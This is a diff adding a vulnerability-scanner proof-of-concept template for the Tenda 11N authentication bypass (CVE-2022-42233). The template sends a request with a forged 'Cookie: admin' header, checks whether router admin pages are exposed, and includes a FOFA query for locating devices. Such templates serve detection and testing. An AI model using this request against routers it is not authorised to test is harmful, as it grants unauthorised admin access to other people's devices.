@@ -1,0 +1,25 @@
+id: poc-yaml-tenda-11n-authentication-bypass
+info:
+  name: Tenda多个产品失效的身份认证漏洞(CVE-2022-42233)
+  severity: high
+  tags:
+  - CVE-2022-42233
+  - 认证绕过
+  finger: 11n
+  fofa: title="Tenda 11N"
+requests:
+- method: GET
+  path: /index.asp
+  headers:
+    Cookie: admin
+  expression: 'status_code == 200
+
+    && contains(body,"def_wirelesspassword")
+
+    && contains(body,"Tenda 11N")
+
+    && contains(headers,"GoAhead-Webs")
+
+    '
+variables: {}
+transport: http
